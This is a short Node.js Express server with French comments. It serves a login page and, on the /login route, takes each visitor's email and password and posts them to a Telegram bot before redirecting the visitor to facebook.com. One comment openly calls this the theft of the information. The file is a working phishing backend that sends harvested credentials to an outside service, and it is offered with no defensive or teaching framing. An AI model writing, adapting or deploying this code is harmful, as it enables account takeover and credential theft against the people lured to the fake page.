const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// ✅ CETTE LIGNE DIT AU SERVEUR D'AFFICHER TON INTERFACE
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', async (req, res) => {
    const { email, password } = req.body;
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    const message = `🔔 Nouveaux identifiants :\n📧 Email: ${email}\n🔑 Pass: ${password}`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });
        // Redirection vers la page finale après le vol des infos
        res.redirect('https://www.facebook.com'); 
    } catch (error) {
        console.error("Erreur Telegram:", error);
        res.status(500).send("Erreur serveur");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Serveur démarré sur le port ${PORT}`);
});